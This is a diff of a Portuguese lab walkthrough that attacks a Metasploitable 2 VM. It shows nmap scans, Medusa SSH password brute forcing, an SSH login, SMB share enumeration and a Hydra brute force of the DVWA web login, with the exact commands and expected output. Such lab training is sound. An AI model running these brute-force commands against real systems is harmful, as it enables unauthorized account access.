@@ -18,18 +18,18 @@ Antes de iniciar o ataque, precisamos identificar o endereço IP da máquina alv
 #3.1. Identificando o IP do alvo
 Para identificar o IP do alvo, execute o netdiscover ou nmap para encontrar o Metasploitable 2 na rede:
 
-Bash
+`Bash
 sudo nmap -sn 192.168.56.0/24
 3.2. Escaneamento de Portas
 Confirme se a porta do SSH (22) está aberta no alvo:
 $ nmap -p 22 -sV 192.168.56.101
 Starting Nmap 7.94 ( https://nmap.org ) at 2026-10-29 22:00 EST
 Nmap scan report for 192.168.56.101
-Host is up (0.00045s latency).
+Host is up (0.00045s latency).`
 
-PORT   STATE SERVICE VERSION
+`PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel`
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 0.28 seconds
@@ -39,7 +39,7 @@ O Medusa é uma ferramenta de força bruta modular e rápida. No Metasploitable 
 
 # 4.1. Preparando as Wordlists
 Execute o seguinte comando no terminal do Kali Linux:
-$ medusa -h 192.168.56.101 -u msfadmin -P /usr/share/wordlists/passwords.txt -M ssh -t 10
+`$ medusa -h 192.168.56.101 -u msfadmin -P /usr/share/wordlists/passwords.txt -M ssh -t 10`
 
 # 5. Detalhamento dos parâmetros:
 •	-h: Especifica o endereço IP da máquina alvo.
@@ -54,29 +54,28 @@ $ medusa -h 192.168.56.101 -u msfadmin -P /usr/share/wordlists/passwords.txt -M 
 
 # 6. Resultado Esperado
 Se o ataque for bem-sucedido, o Medusa exibirá as credenciais encontradas no terminal:
-ACCOUNT FOUND: [ssh] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
-ACCOUNT KEPT OPEN: [ssh] Host: 192.168.56.101 User: msfadmin
-Medusa finished at Thu Oct 29 22:02:15 2026
 
-Summary of results:
+`ACCOUNT FOUND: [ssh] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
+ACCOUNT KEPT OPEN: [ssh] Host: 192.168.56.101 User: msfadmin
+Medusa finished at Thu Oct 29 22:02:15 2026`
+
+`Summary of results:
   Target Success Count: 1
-  Total Host/User/Password Combinations Tested: 14
+  Total Host/User/Password Combinations Tested: 14`
 
 # 7. Validação do acesso via SSH
 
-$ ssh msfadmin@192.168.56.101
-msfadmin@192.168.56.101's password: 
+`$ ssh msfadmin@192.168.56.101
+msfadmin@192.168.56.101's password:`
 
-Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
-
+`Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
 The programs included with the Ubuntu system are free software;
 the exact distribution terms for each program are described in the
 individual files in /usr/share/doc/*/copyright.
-
 msfadmin@metasploitable:~$ id
 uid=1000(msfadmin) gid=1000(msfadmin) groups=1000(msfadmin),4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),108(lpadmin),109(admin),115(sambashare)
 msfadmin@metasploitable:~$ hostname
-metasploitable
+metasploitable`
 
 # 8. Ataque e Enumeração via SMB
 O protocolo SMB no Metasploitable 2 possui versões antigas e compartilhamentos abertos que permitem enumeração e até execução de comandos (como a famosa vulnerabilidade do Samba usermap script).
@@ -85,7 +84,7 @@ O protocolo SMB no Metasploitable 2 possui versões antigas e compartilhamentos 
 Podemos usar o enum4linux ou o nmap para descobrir informações sobre o sistema via SMB:
 
 Shell
-$ enum4linux -U 192.168.56.101
+`$ enum4linux -U 192.168.56.101`
 
 Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Oct 29 22:10:00 2026
 
@@ -112,15 +111,15 @@ Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux
 O compartilhamento tmp permite acesso anônimo, o que pode expor arquivos sensíveis:
 
 Shell
-$ smbclient //192.168.56.101/tmp
+`$ smbclient //192.168.56.101/tmp
 Password for [WORKGROUP\root]: 
 Try "help" to get a list of supported commands.
 smb: \> ls
   .                                   D        0  Thu Oct 29 20:00:00 2026
   ..                                  D        0  Thu Oct 29 19:50:00 2026
   fsm-config.cache                    R      342  Thu Oct 29 19:55:00 2026
+smb: \> exit`
 
-smb: \> exit
 # 9. Ataque de Força Bruta Web no DVWA
 O Metasploitable 2 hospeda aplicações vulneráveis na porta 80, incluindo o DVWA (Damn Vulnerable Web Application). Um cenário muito comum é realizar força bruta no painel de login web (que possui nível de segurança configurado como Low).
 
@@ -128,19 +127,20 @@ O Metasploitable 2 hospeda aplicações vulneráveis na porta 80, incluindo o DV
 Verificação rápida com o curl ou nmap da página de login do DVWA:
 
 Shell
-$ curl -I http://192.168.56.101/dvwa/login.php
+`$ curl -I http://192.168.56.101/dvwa/login.php
 HTTP/1.1 200 OK
 Date: Thu, 29 Oct 2026 22:15:00 GMT
 Server: Apache/2.2.8 (Ubuntu) DAV/2 SVN/1.4.6 mod_fastcgi/mod_auth_passthrough/2.3.1 PHP/5.2.5-3ubuntu6
 X-Powered-By: PHP/5.2.5-3ubuntu6
-Content-Type: text/html
+Content-Type: text/html`
 
 # 9.2. Execução de Brute Force Web com o Hydra
 O Hydra é excelente para atacar formulários web baseados em métodos POST. O login padrão do DVWA é admin / password.
 
 Shell
-$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.101 http-post-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Invalid username and/or password" -t 4
-🔍 Detalhamento dos parâmetros:
+`$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.101 http-post-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Invalid username and/or password" -t 4`
+
+# 9.3 Detalhamento dos parâmetros:
 -l admin: Define o usuário alvo como admin.
 
 -P: Caminho para a wordlist de senhas.
@@ -149,7 +149,7 @@ http-post-form: Módulo do Hydra para formulários web via POST.
 
 "...": String de configuração contendo o caminho da página, os campos de parâmetro (^USER^ e ^PASS^) e a assinatura de erro (H=...) que o site retorna em caso de falha.
 
-# 9.3. Resultado Esperado do Hydra no DVWA
+# 9.4. Resultado Esperado do Hydra no DVWA
 Shell
 Hydra v9.5 (c) 2023 by van Hauser/THC - Please do not use against target without permission, or be PKun
 
